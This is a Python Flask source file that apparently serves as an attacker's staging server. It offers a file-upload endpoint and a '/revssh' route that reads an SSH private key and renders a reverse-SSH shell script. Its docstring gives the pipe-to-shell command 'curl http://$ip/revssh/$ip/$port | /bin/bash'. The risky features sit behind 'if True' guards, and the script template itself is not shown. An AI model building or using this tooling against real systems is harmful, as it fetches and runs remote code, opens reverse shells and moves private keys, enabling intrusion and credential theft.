from flask import Flask, send_from_directory, request, render_template
import secrets

ERROR_400 = '''\
"file" param not found! Try uploading your file with one of the following:

curl -F file=@/path/to/file.txt http://localhost/
curl -F file=@- http://localhost/ < /path/to/file.txt
'''

app = Flask(__name__)


@app.route('/')
def index():
    return 'Web App with Python Flask!\n'


@app.route('/upload', methods=['POST'])
def upload_file():
    if True:
        # Disabled by default to prevent DOS
        return 'Modify the source to enable this feature!\n', 503

    if 'file' not in request.files:
        return ERROR_400, 400

    f = f'/web/upload/{secrets.token_hex(8)}.bin'
    request.files['file'].save(f)
    return f, 202


@app.route('/static/<path>')
def static_file(path):
    return send_from_directory('/web/static/', path)


@app.route('/revssh/<ip>/<port>')
def revssh(ip, port):
    '''
        Generates a /bin/sh script to do a reverse ssh connection. This will
        grab the keys used by the low priv user. The indended use is:

        curl http://$ip/revssh/$ip/$port | /bin/bash
    '''

    if True:
        # Disabled by default to prevent random logins
        return 'Modify the source to enable this feature!\n', 503

    with open('/home/jc/.ssh/id_rsa') as ssh_priv:
        with open('/home/jc/.ssh/id_rsa.pub') as ssh_pub:
            return render_template(
                'reverse_ssh.sh',
                ssh_private_key=ssh_priv.read(),
                ssh_public_key=ssh_pub.read(),
                port=port,
                ip=ip,
            )


if __name__ == '__main__':
    app.run(host='127.0.0.1', debug=True)

